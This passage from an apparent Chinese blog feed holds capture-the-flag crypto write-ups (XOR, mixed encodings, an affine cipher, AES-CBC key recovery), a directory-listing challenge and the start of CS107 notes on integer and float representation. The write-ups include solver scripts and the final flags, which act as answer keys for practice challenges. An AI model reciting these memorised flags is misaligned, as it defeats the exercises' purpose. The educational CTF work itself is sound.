data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> f <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    ciphertext<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>f <span class=\"token operator\">^</span> key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span></pre></td></tr></table></figure><p>利用在线转换工具将十六进制转换为二进制，得到前 5 个字符的二进制为：</p>\n<pre><code>11101001 11100011 11101110 11101000 11110100\n</code></pre>\n<p>我们可以猜测 前五个字母应该是 flag {，利用 ASCII 转二进制可以知道为：</p>\n<pre><code>01100110 01101100 01100001 01100111 01111011\n</code></pre>\n<p>异或：</p>\n<pre><code>10001111 10001111\n</code></pre>\n<p>可以知道异或密钥为 10001111。然后先利用 16 进制转 2 进制网站，将密文转换为 2 进制；再利用异或在线解密将密文转换为明文；最后用 2 进制转换为 ASCII 码，得到正确答案，flag：  <code>flag&#123;x0r_15_symm3try_and_e4zy!!!!!!&#125;</code></p>\n<h2 id=\"buuctf-crypto-babyencoding-task_3txt\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-babyencoding-task_3txt\">#</a> BUUCTF - Crypto babyencoding task_3.txt</h2>\n<p>题目如下所示：</p>\n<pre><code>part 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=\npart 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=\npart 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`\n</code></pre>\n<p>第一行就是 Base64 编码，解码得到：</p>\n<pre><code>flag&#123;dazzling_encoding#4e0ad4\n</code></pre>\n<p>第二行使用 Base64 编码解码得到乱码：</p>\n<pre><code>1?  ?P  ? ?Q1  0?P0?  ??1?? ?R1?? ?\n</code></pre>\n<p>尝试使用 Base32 工具解码得到：</p>\n<pre><code>f0ca08d1e1d0f10c0c7afe422fea7\n</code></pre>\n<p>第三行应该是 UUencode，解码后得到：</p>\n<pre><code>c55192c992036ef623372601ff3a&#125;\n</code></pre>\n<p>把答案拼起来试试：</p>\n<pre><code>flag&#123;dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a&#125;\n</code></pre>\n<p>结果正确。</p>\n<h2 id=\"buuctf-crypto-affine-task_2-caesar-with-multiplication\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-affine-task_2-caesar-with-multiplication\">#</a> BUUCTF - Crypto Affine  task_2 Caesar with multiplication</h2>\n<p>题目如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> flag<span class=\"token punctuation\">,</span> key</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>modulus <span class=\"token operator\">=</span> <span class=\"token number\">256</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ciphertext <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> f <span class=\"token keyword\">in</span> flag<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    ciphertext<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span>f <span class=\"token operator\">+</span> key<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> modulus<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064</span></pre></td></tr></table></figure><p>该题目为  <code>仿射</code> ，提示是  <code>凯撒和乘法</code></p>\n<p>先将密文前五位 16 进制转为 10 进制：</p>\n<pre><code>221 67 136 238 66\n</code></pre>\n<p>根据 modulus 为 256，判断密文应该是对应的 扩展的 ASCII 码。前五位字符原先应该是  <code>flag&#123;</code> ，其所对应的十进制数为：</p>\n<pre><code>102 108 97 103 123\n</code></pre>\n<p>进行暴力破解，我们知道 k0 的逆元 和 k1 的值一定不会大于 256：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>modulus <span class=\"token operator\">=</span> <span class=\"token number\">256</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>x <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">221</span><span class=\"token punctuation\">,</span><span class=\"token number\">67</span><span class=\"token punctuation\">,</span><span class=\"token number\">136</span><span class=\"token punctuation\">,</span><span class=\"token number\">238</span><span class=\"token punctuation\">,</span><span class=\"token number\">66</span><span class=\"token punctuation\">]</span>   <span class=\"token comment\">#密文</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>y <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">102</span><span class=\"token punctuation\">,</span><span class=\"token number\">108</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span><span class=\"token number\">103</span><span class=\"token punctuation\">,</span><span class=\"token number\">123</span><span class=\"token punctuation\">]</span>    </pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> k0 <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">257</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> k1 <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">257</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        y_ <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            y_<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>k0<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span> x<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> k1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> modulus<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> y_ <span class=\"token operator\">==</span> y<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'k0为:'</span><span class=\"token punctuation\">,</span>k0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'k1为:'</span><span class=\"token punctuation\">,</span> k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'y_为'</span><span class=\"token punctuation\">,</span>y_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></table></figure><p>破解结果为：</p>\n<pre><code>k0的逆元 为: 241\nk1为: 23\n</code></pre>\n<p>利用求逆元函数得到，k0 为 17 （没有什么用了）</p>\n<p>根据密文转化为 10 进制数带入上述式子，得到明文 10 进制数为：</p>\n<pre><code>[102, 108, 97, 103, 123, 52, 102, 102, 49, 110, 101, 95, 99, 49, 112, 104, 101, 114, 95, 105, 53, 95, 118, 101, 114, 121, 95, 51, 97, 122, 121, 125]\n</code></pre>\n<p>再将其转化为 ASCII 码得到 flag： <code>flag&#123;4ff1ne_c1pher_i5_very_3azy&#125;</code></p>\n<h2 id=\"buuctf-crypto-babyaes-task_1-了解下aes是什么\"><a class=\"markdownIt-Anchor\" href=\"#buuctf-crypto-babyaes-task_1-了解下aes是什么\">#</a> BUUCTF - Crypto babyaes  task_1 了解下 aes 是什么</h2>\n<p>题目如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> flag <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">pad</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> data <span class=\"token operator\">+</span> <span class=\"token string\">b\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">b'\\x00'</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    flag_ <span class=\"token operator\">=</span> pad<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    key <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    iv <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>bytes_to_long<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> bytes_to_long<span class=\"token punctuation\">(</span>iv<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    aes <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span> iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    enc_flag <span class=\"token operator\">=</span> aes<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>flag_<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>enc_flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># 3657491768215750635844958060963805125333761387746954618540958489914964573229</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\"># b'>]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i'</span></pre></td></tr></table></figure><p>该题目为 AES 加密，使用了一个密钥 key 和初始化向量 iv，选择的 CBC 模式加密。</p>\n<p>先分析一下题目中的几个关键函数和方法：</p>\n<pre><code>urandom:\n\n语法  os.urandom（size）\n参数：\n\tsize:字符串随机字节的大小\n\t返回值：该方法返回一个字符串，该字符串表示适合加密使用的随机字节。\n例 os.urandom(1)\n输出：b'\\x91'\n二进制：10010001 （8bits）\n</code></pre>\n<pre><code>AES.new(key, mode, *args, **kwargs)\n\nparam key(参数密钥):\n在对称密码中使用的秘密密钥。\n\n它必须为16、24或32个字节长（分别用于AES-128， AES-192或AES-256）。\n\nmode（模式）\n模式（支持的MODE_*常量之一）–用于加密或解密的链接模式。\n学习链接：https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html\n\nKeyword Arguments（关键字参数）：\nIV（字节，字节组，memoryview） - （只适用于MODE_CBC，MODE_CFB，MODE_OFB，和MODE_OPENPGP模式）。\n\n用于加密或解密的初始化向量。\n\n对于MODE_CBC，MODE_CFB和MODE_OFB它必须是16个字节。\n</code></pre>\n<p>解题思路：<br>\n解密 flag 我们需要获取到 key 和 iv 的值，由条件：<br>\nkey=os.urandom(16)*2<br>\niv=os.urandom(16)<br>\n 可知：key 是 32bytes,256bits ；iv 是 16bytes ,128bits</p>\n<p>key^iv ，那么只有 iv 与 key 的低 128 位相异或，所以 key 的高 128 位是固定不变的。所以输出结果的高 128bits, 就是 key 的高 128bits, 进而可以得到 key 的所有值 256bits。之后 key 的低 128bits，与输出结果的低 128bits 相异或，所得结果就是 iv 的值了。key,iv 得到后直接 aes.decrypt () 解密就 ok 了。<br>\n代码如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>xor <span class=\"token operator\">=</span> <span class=\"token number\">3657491768215750635844958060963805125333761387746954618540958489914964573229</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>enc_flag <span class=\"token operator\">=</span> <span class=\"token string\">b'>]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>out <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>xor<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>key <span class=\"token operator\">=</span> out<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span><span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'key为:'</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>iv <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">^</span>bytes_to_long<span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># print(iv)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>iv <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'iv为:'</span><span class=\"token punctuation\">,</span>iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>aes <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span>AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span>iv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>flag <span class=\"token operator\">=</span> aes<span class=\"token punctuation\">.</span>decrypt<span class=\"token punctuation\">(</span>enc_flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>运行后得到： <code>b'firsT_cry_Aes\\x00\\x00\\x01'</code> ，其中  <code>firsT_cry_Aes</code>  是我们需要的内容，其余部分只是填充使字符串长度达到 16。所以最终的 flag 为  <code>flag&#123;firsT_cry_Aes&#125;</code></p>\n",
            "tags": []
        },
        {
            "id": "http://yanagi-kon.github.io/2023/09/20/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/",
            "url": "http://yanagi-kon.github.io/2023/09/20/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/",
            "title": "目录遍历",
            "date_published": "2023-09-20T00:44:10.000Z",
            "content_html": "<h1 id=\"目录遍历\"><a class=\"markdownIt-Anchor\" href=\"#目录遍历\">#</a> 目录遍历</h1>\n<p>打开题目可以看到如下页面，该题本质上就是遍历所有目录找取 flag。目录数目不多，所以一个一个点击查找就可以找到。</p>\n<p><img data-src=\"image-20230920084821330.png\" alt=\"image-20230920084821330\"></p>\n<p>找到  <code>flag.txt</code>  文件</p>\n<p><img data-src=\"image-20230920085047645.png\" alt=\"image-20230920085047645\"></p>\n<p>打开得到  <code>flag</code>  为</p>\n<pre><code>ctfhub&#123;bcd6fcf15f15f45dd0cf1a0c&#125;\n</code></pre>\n",
            "tags": []
        },
        {
            "id": "http://yanagi-kon.github.io/2023/09/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_2/",
            "url": "http://yanagi-kon.github.io/2023/09/19/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_2/",
            "title": "斯坦福编程范式CS107_2",
            "date_published": "2023-09-19T12:28:00.000Z",
            "content_html": "<h2 id=\"斯坦福编程范式cs107_2\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_2\">#</a> 斯坦福编程范式 CS107_2</h2>\n<table>\n<thead>\n<tr>\n<th><strong>C/C++</strong></th>\n<th style=\"text-align:left\"></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>bool</td>\n<td style=\"text-align:left\"></td>\n</tr>\n<tr>\n<td>char</td>\n<td style=\"text-align:left\">1  byte</td>\n</tr>\n<tr>\n<td>short</td>\n<td style=\"text-align:left\">2  bytes</td>\n</tr>\n<tr>\n<td>int</td>\n<td style=\"text-align:left\">2–4 bytes</td>\n</tr>\n<tr>\n<td>long</td>\n<td style=\"text-align:left\">4 bytes</td>\n</tr>\n<tr>\n<td>long long</td>\n<td style=\"text-align:left\">8  bytes</td>\n</tr>\n<tr>\n<td>float</td>\n<td style=\"text-align:left\">4  bytes</td>\n</tr>\n<tr>\n<td>double</td>\n<td style=\"text-align:left\">8  bytes</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"1为什么二进制中不简单的将-1-置在最左侧表示负数如-3为-1011\"><a class=\"markdownIt-Anchor\" href=\"#1为什么二进制中不简单的将-1-置在最左侧表示负数如-3为-1011\">#</a> 1.\t为什么二进制中不简单的将 1 置在最左侧表示负数（如，-3 为 1011）</h4>\n<p>因为如果是这样的话，-3 + 3 将等于：</p>\n<pre><code>1011 + 0011 = 1110 \n</code></pre>\n<p>显然结果是 -6 而不是 0。所以为了使正负数相加得到全 0 或全 1，如：</p>\n<pre><code>1100 + 0011 = 1111\n</code></pre>\n<p>这样得到全 1 后，我们只需要再 +1，就可以得到全 0：</p>\n<pre><code>1111 + 0001 = (1)0000   这里的1越界了所以不算\n</code></pre>\n<p>所以实际上，我们采用 <strong>全部取反 并 +1</strong> 的方式用来表示负数： -3 （1101）. 这种方法就叫做  <code>2补码</code></p>\n<p>在 short 类型中，为了使 正数和负数 的数量一致，我们把最左边的那一比特空出，用于分割正数和负数，即正数最大为 $2^{15} -1 $：</p>\n<pre><code>0 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1   \n</code></pre>\n<p>负数最小是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>15</mn></msup></mrow><annotation encoding=\"application/x-tex\">- 2^{15}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.897438em;vertical-align:-0.08333em;\"></span><span class=\"mord\">−</span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">5</span></span></span></span></span></span></span></span></span></span></span></span>：</p>\n<pre><code>1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n</code></pre>\n<h4 id=\"2语言中变量间的相互赋值是如何实现的\"><a class=\"markdownIt-Anchor\" href=\"#2语言中变量间的相互赋值是如何实现的\">#</a> 2.\t语言中变量间的相互赋值是如何实现的？</h4>\n<p>当我们运行如下程序的时候：</p>\n<pre><code class=\"language-c++\">char ch = 'A';\nshort s = ch;\ncout &lt;&lt; s &lt;&lt; endl;\n------\n65\n</code></pre>\n<p>在内存中就是这样进行的：(每一个格子代表 1byte)，内存直接将 <code>ch</code>  的内容复制道 <code>s</code>  中。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">ch</th>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\">65</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">s</td>\n<td style=\"text-align:center\">0</td>\n<td style=\"text-align:center\">65</td>\n</tr>\n</tbody>\n</table>\n<p>如果运行如下程序时：</p>\n<pre><code class=\"language-c++\">short s = 67;\nchar ch = s;\ncout &lt;&lt; ch &lt;&lt; endl;\n------\nC\n</code></pre>\n<p>进行如上赋值操作时，16bit 不能够被直接压缩成为 8bit 的模式。因而 C 和 C++ 中会简单的只关注低位上的内容，而把高位内容直接丢弃。</p>\n<p>如果进行如下程序时：</p>\n<pre><code class=\"language-c++\">short s = -1;\nint i = s;\t\n</code></pre>\n<p>内存中所进行的操作是这样的：</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">s</th>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\"></th>\n<th style=\"text-align:center\">1…1</th>\n<th style=\"text-align:center\">1…1</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">int</td>\n<td style=\"text-align:center\">1…1</td>\n<td style=\"text-align:center\">1…1</td>\n<td style=\"text-align:center\">1…1</td>\n<td style=\"text-align:center\">1…1</td>\n</tr>\n</tbody>\n</table>\n<p>这种操作被称为 “符号扩展”。会将 符号位一位一位向上复制，就会导致 int 的前两字节内全变为 1，使得实际的数值仍然为  <code>-1</code></p>\n<h5 id=\"3浮点数float\"><a class=\"markdownIt-Anchor\" href=\"#3浮点数float\">#</a> 3.\t浮点数 float</h5>\n<p>对于浮点数 float，其将整数范围缩小，节省下来的 bit 位用来表示 2 的负次幂，这样就可以表示小数了。这是技术上可以实现的一种方式，但 <code>实际上并不是这样</code> 。</p>\n<p>实际上对于浮点数这样 4 byte 大小的数，浮点数将其中的 1 位用来表示符号，将其中的 8 位用来表示整数，剩下的 23 位用来表示小数。如下：</p>\n<pre><code>s \t\t\texp(8bit)\t\t\txxxxxxxx(23bit)\n</code></pre>\n<p>那么任何一个数都可以用如下形式进行表示：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mo stretchy=\"false\">(</mo><mo>−</mo><mn>1</mn><msup><mo stretchy=\"false\">)</mo><mi>S</mi></msup><mtext>  </mtext><mn>1.</mn><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mi>x</mi><mtext>  </mtext><mo>×</mo><mtext>  </mtext><msup><mn>2</mn><mrow><mi>e</mi><mi>x</mi><mi>p</mi><mo>−</mo><mn>127</mn></mrow></msup><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mo stretchy=\"false\">(</mo><mn>255</mn><mo>≥</mo><mi>e</mi><mi>x</mi><mi>p</mi><mo>≥</mo><mn>0</mn><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(-1)^S\\;1.xxxxxxxxx\\;×\\;2^{exp-127}     \\;\\;\\;\\;\\;\\;(255≥exp≥0)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.1413309999999999em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\">−</span><span class=\"mord\">1</span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05764em;\">S</span></span></span></span></span></span></span></span><span class=\"mspace\" 